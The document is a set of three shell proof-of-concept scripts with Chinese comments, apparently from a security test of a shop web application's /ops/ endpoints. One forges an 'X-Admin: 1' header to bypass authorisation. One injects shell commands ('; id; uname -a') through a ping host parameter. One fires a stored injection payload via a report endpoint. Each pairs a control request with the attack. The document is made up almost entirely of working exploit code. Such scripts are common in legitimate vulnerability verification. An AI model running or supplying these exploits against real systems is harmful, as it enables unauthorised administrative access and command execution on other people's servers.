#!/bin/sh
BASE=${BASE:-http://target}
# 正常对照：不带 X-Admin 头
curl -s -o /dev/null -w 'no-header:%{http_code}\n' "$BASE/ops/maintenance.php"
# 攻击：伪造 X-Admin 并提交任务
curl -s -X POST -H 'X-Admin: 1' -H 'Accept: application/json' "$BASE/ops/maintenance.php"

#!/usr/bin/env bash
# 用法: BASE=http://TARGET SID=<operator会话cookie值> bash poc_ping_cmdi.sh
BASE=${BASE:-http://127.0.0.1:8080}
COOKIE=${COOKIE:-"SHOPSESSID=<operator-session-id>"}
echo '[*] Normal input (control):'
curl -s -b "$COOKIE" -G "$BASE/ops/ping.php" --data-urlencode 'host=127.0.0.1' | grep -A3 diagnostic-output
echo '[*] Attack input:'
curl -s -b "$COOKIE" -G "$BASE/ops/ping.php" --data-urlencode 'host=127.0.0.1; id; uname -a' | grep -A6 diagnostic-output

#!/usr/bin/env bash
BASE=${BASE:-http://target}
COOKIE=${COOKIE:-SHOPSESSID=YOUR_SESSION_ID}
# 前提：先把 user_id=1 的 nickname 更新为注入载荷（取决于资料更新接口）
# 若已有被污染记录，直接请求报表：
echo '[attack]'
curl -s -H "Cookie: $COOKIE" -H 'Accept: application/json' \
  "$BASE/ops/report.php?user_id=1"

